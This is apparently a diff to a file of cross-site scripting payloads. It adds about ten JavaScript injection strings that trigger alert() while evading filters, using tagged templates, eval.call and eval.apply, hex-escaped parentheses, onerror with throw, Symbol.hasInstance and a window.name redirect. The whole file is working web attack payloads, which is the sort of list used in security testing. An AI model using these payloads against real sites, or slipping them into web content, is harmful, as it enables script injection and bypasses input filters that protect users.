@@ -1,2 +1,12 @@
 -- This contains the payload for performing XSS injections--
 <script>alert(1)</script>
+alert`23`
+window.name="javascript:alert(23)"; location="xss.html";
+eval.call`${'alert\x2823\x29'}`
+eval.apply`${[`alert\x2823\x29`]}`
+setTimeout`alert\x2823\x29` setInterval`alert\x2823\x29`
+onerror=alert;throw 23;
+'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}
+{onerror=alert}throw 23
+throw onerror=eval,Error`alert\x2823\x29`
+'-alert(1)-'
